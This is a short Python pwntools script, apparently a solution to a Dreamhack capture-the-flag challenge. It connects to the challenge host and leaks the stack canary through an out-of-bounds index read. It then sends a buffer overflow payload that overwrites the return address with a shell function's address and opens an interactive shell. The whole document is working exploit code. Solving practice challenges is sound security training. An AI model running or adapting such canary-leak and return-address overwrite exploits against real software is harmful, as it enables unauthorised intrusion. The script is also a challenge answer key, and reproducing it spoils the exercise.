from pwn import *
  

port = 22292
rem = remote("host3.dreamhack.games", port)

shell_address = 0x80486b9

canary = []
for i in range(3, -1, -1) :
  rem.sendafter(b">", b"P")
  rem.sendlineafter(b'index :', str(0x80 + i).encode())
  rem.recvuntil(b"is : ")
  canary.append(rem.recvn(2).decode())
canary = int(''.join(canary), 16)


rem.sendafter(b">", b"E")
payload = b"A" * 0x40
payload += p32(canary)
payload += b"B" * 8
payload += p32(shell_address)
 
rem.sendlineafter(b"Size :", str(len(payload) + 2).encode())
rem.sendlineafter(b"Name :", payload)

rem.interactive()